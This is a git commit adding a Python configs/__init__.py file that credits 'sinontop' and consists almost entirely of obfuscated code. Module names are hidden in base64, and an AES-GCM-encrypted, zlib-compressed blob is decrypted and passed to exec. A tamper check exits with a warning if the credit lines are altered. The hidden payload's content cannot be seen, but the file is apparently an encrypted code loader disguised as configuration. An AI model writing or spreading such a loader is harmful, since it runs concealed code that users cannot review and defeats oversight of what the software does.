ed3c6342699314bc100415c2cd1e37cd00b7e634
S1N <151928881+sintxcs@users.noreply.github.com>
2025-06-11 19:45:36 +0800

    Add files via upload

---
+++ configs/__init__.py
@@ -0,0 +1,78 @@
+author = 'sinontop'
+tgChannel = 't.me/mksln'
+website = 'https://sinontop.gleeze.com/'
+
+import base64 as ayozPDfoiDGxCn
+PG5P6m_OjKU1ZZY = 'emxpYg=='
+PR48_w1xp6 = 'Q3J5cHRvLkNpcGhlcg=='
+ceiHE3ZEG = 'QUVT'
+mFgdgV7GypOfw = 'c3lz'
+zf3Mpif3biMWD8_ = __import__(ayozPDfoiDGxCn.b64decode(PG5P6m_OjKU1ZZY).decode('utf-8'))
+Hsmetr = __import__(ayozPDfoiDGxCn.b64decode(mFgdgV7GypOfw).decode('utf-8'))
+try:
+    XSNryOF5aN9_4cxY = __import__(ayozPDfoiDGxCn.b64decode(PR48_w1xp6).decode('utf-8'), fromlist=[ayozPDfoiDGxCn.b64decode(ceiHE3ZEG).decode('utf-8')])
+    unAdHXBA = getattr(XSNryOF5aN9_4cxY, ayozPDfoiDGxCn.b64decode(ceiHE3ZEG).decode('utf-8'))
+except Exception:
+    unAdHXBA = None
+WtwyQvtjqmeiKNvZVx = 'c2lub250b3A='
+irNIqzlC = 'dC5tZS9ta3Nsbg=='
+QuJuvenRW = 'aHR0cHM6Ly9zaW5vbnRvcC5nbGVlemUuY29tLw=='
+XSoVNF2 = 'cThWU0ZTREF1RFFPQ1EwUG9ERjBjK084cFUwUVFWbW5PSkFrRXhVY0s5UDlqSzJRc2JYUkFMcnlZa0c0aExOVnppWTBvSUU1N2hLOHZyY2xuUVpielFzc0gzSEZzeWwxVHBzQzR5QmVBb0ZjSndWVVJyak9IOC9hTDhHUjBRSVpvM0UwSGI0NXlLMHJEaEdlamVtQUF4bkRnS0YyNkRTY0w5WmFOSStHY0pINVRCeU9Uc2lkeXlaNG9BV3FBL2tZc2IzeE4vVGZBeWRvSVNSMFZiYnJ0N0tTY1hFcXhRZ1NGVFZlTy8wLzY3bzAvOFZqcWFYVldlcytlckNJOEFDN1A3Z2pFaVFnQkFmNGtYS3doODdLQjhlTGFiRjNiWjFpc2NlS1FqMGtxeUM0RjF0N3dsVG1NZWlIKzdGeCtJZVVSR2dhY1hvNUVYTVlscGx0VjUyblY4Zm94OVAzOGN6NExTUDNCTWdMaVJWYkdVeUJUcFMzYkQ5RHc4RjZRUHMyWkgwZ1ZEWkdZL3JHN1VIeUMyeDJEZUJwTVN2UHZvSzRuOXhIZWpQRmNXMHFRTVRZRUFWd2lnZStxREtlc1VHb3pFSnd1TVVJSkJBQ2FESHVTekY1dXRlNGs1MWQ1RVByVkREdlZPZWJiTHpiWmpxUng2STZ5UW8vY3RxS2lHYXk4cmRCUmVNZ2NSS21XOE9CZ3ZhR0pQMCttdU5TaXBLelVkN21zbHdLa1VHRStwcUFaWGd4V3d0K21BTjl1elNRcExjUytnRnVwMzU2WkxZNDlXRzFjWXhBUUZRLy90bW84Y2tCeHBMaFZydEJLNWU5RGVGdVNYMDBXTTQ3RGFER0RHL1ArYXRFMEk4cnRzU0wxNjE0R1lUTUxHbllld3FyVCtwZ2I0aVFRMnJXQkN5bW5Zdng3Qmh3bFpMbWZkdW9IamNDdExBKyt4WTlaL2oxZ2R1NkdGTGZGd0NCaVQxZ2t0MFRGOHRLSVAxQ212Uk13ZGFUVHlkQlZVbW8xdS9KQ3lVV0dWQ05kVlJUTW50ODlSbHNMMmJHbHRYUE9TTG5pNzlQR2E3Qm1Mb0tFUXVuNkx2Zm80bk1yM1JRak5Wa2dDM3ErcnZoMkNYNmxXc1I0b0FrYTN3RGtSRVRicUZtemxHN01KOGRjdTFEQ1g3NXJJbWFJbCtUQkdvN1ZiMkxjem02RlovTzh0TDFaUE04c0k0QzYxTTdxMVhsUHFvWmNqZTlWNVZBQmdJVDhvOWk0L0FFb3dnTmtaRDR4dlR4R0lpbXBTdzBBNGRSQXg3UWNYNSt5c3FQSW0zY1RaMzg0Z284TzhIRmdpTUc5WlVDa3h1SHNGN29MTmJMbHVhd1Zoc004bWxEaG1UZ3NBais='
+bowJSFL = 'SitxVS83T2Y1WUN2R1RRazUwbmx5QT09'
+cFFXi7j = 'THlFQ1RydGVwWHRKN3hYUFo5OHVyWjFzQ2dXWi9UbG55V3I0bGZDZGVLST0='
+tzo4rXmm9 = 'MlI0RnJTNElHT0ZLY0Vwaw=='
+Yoq42IL3cvmdYWeL0M = 'WVhWMGFHOXlJRDBnSjNOcGJtOXVkRzl3Snc9PQpkR2REYUdGdWJtVnNJRDBnSjNRdWJXVXZiV3R6Ykc0bgpkMlZpYzJsMFpTQTlJQ2RvZEhSd2N6b3ZMM05wYm05dWRHOXdMbWRzWldWNlpTNWpiMjB2Snc9PQ=='
+wSDm27J24ubv = 'SVNBIEtBTkcgTEVHSVQgTkEgTUFLQVNBTEFOQU4sIElUTyBPV05FUiBPSDogc2lub250b3AsIHQubWUvbWtzbG4='
+def nMZ5CDsOrrsBo():
+    try:
+        _decoded_expected_header_joined = ayozPDfoiDGxCn.b64decode(Yoq42IL3cvmdYWeL0M).decode('utf-8')
+        _expected_lines_b64 = _decoded_expected_header_joined.split('\n')
+        _expected_plain_lines = [ ayozPDfoiDGxCn.b64decode(line).decode('utf-8') for line in _expected_lines_b64 ]
+        _num_expected_lines = len(_expected_plain_lines)
+        _actual_lines = []
+        with open(__file__, 'r', encoding='utf-8') as f_self:
+            for _i in range(_num_expected_lines):
+                _line = f_self.readline().strip('\r\n')
+                _actual_lines.append(_line)
+        if _actual_lines != _expected_plain_lines:
+            _decoded_msg = ayozPDfoiDGxCn.b64decode(wSDm27J24ubv).decode('utf-8')
+            print(_decoded_msg)
+            Hsmetr.exit(1)
+        return True
+    except Exception:
+        return False
+def HqzZsJGGgx1H8HUrD():
+    if not nMZ5CDsOrrsBo(): return
+    if unAdHXBA is None: return
+    try:
+        pQMr9I2xPG183jK0zl = ayozPDfoiDGxCn.b64decode(ayozPDfoiDGxCn.b64decode(cFFXi7j).decode('utf-8'))
+        UI1zvZ = ayozPDfoiDGxCn.b64decode(ayozPDfoiDGxCn.b64decode(tzo4rXmm9).decode('utf-8'))
+        VQUt8yAs_lYUdyP9TN = ayozPDfoiDGxCn.b64decode(ayozPDfoiDGxCn.b64decode(XSoVNF2).decode('utf-8'))
+        XK4LxyJRDxTd4MQKl = ayozPDfoiDGxCn.b64decode(ayozPDfoiDGxCn.b64decode(bowJSFL).decode('utf-8'))
+        _op_pred_author_check = ayozPDfoiDGxCn.b64decode(WtwyQvtjqmeiKNvZVx).decode('utf-8') == 'sinontop'
+        if not (len(pQMr9I2xPG183jK0zl) + len(UI1zvZ) == 44 and _op_pred_author_check): return
+        nZf678UCIeyao2K = unAdHXBA.new(pQMr9I2xPG183jK0zl, unAdHXBA.MODE_GCM, nonce=UI1zvZ)
+        HPSI9I = nZf678UCIeyao2K.decrypt_and_verify(VQUt8yAs_lYUdyP9TN, XK4LxyJRDxTd4MQKl)
+        uwLwoVbyG_t = zf3Mpif3biMWD8_.decompress(HPSI9I)
+        RDTMijpt6wh8GNd = uwLwoVbyG_t.decode('utf-8')
+        YNi21twxT4pX69rGy = globals()
+        G9rUfS = ayozPDfoiDGxCn.b64decode(b'X19maWxlX18=').decode('utf-8')
+        DHnXol = ayozPDfoiDGxCn.b64decode(b'X19uYW1lX18=').decode('utf-8')
+        TesKECfkYsVDU = ayozPDfoiDGxCn.b64decode(b'X19tYWluX18=').decode('utf-8')
+        obift29r8KHGF = YNi21twxT4pX69rGy.copy()
+        obift29r8KHGF.update({
+            G9rUfS: YNi21twxT4pX69rGy.get(G9rUfS, 'executed_string_default_path'),
+            DHnXol: TesKECfkYsVDU,
+        })
+        h7oysFa6bUe = ayozPDfoiDGxCn.b64decode(b'ZXhlYw==').decode('utf-8')
+        getattr(__builtins__, h7oysFa6bUe)(RDTMijpt6wh8GNd, obift29r8KHGF, obift29r8KHGF)
+    except Exception: pass
+YNi21twxT4pX69rGy = globals()
+TesKECfkYsVDU = ayozPDfoiDGxCn.b64decode(b'X19tYWluX18=').decode('utf-8')
+G9rUfS = ayozPDfoiDGxCn.b64decode(b'X19maWxlX18=').decode('utf-8')
+NnqWHM = ayozPDfoiDGxCn.b64decode(b'X19idWlsdGluc19f').decode('utf-8')
+_cond1 = hasattr(YNi21twxT4pX69rGy.get(NnqWHM), ayozPDfoiDGxCn.b64decode(b'Z2V0YXR0cg==').decode('utf-8'))
+_cond2_a = YNi21twxT4pX69rGy.get(G9rUfS, '').endswith('_obf.py')
+_cond2_b = YNi21twxT4pX69rGy.get('__name__') == TesKECfkYsVDU
+if _cond1 and (_cond2_a or _cond2_b):
+    HqzZsJGGgx1H8HUrD()
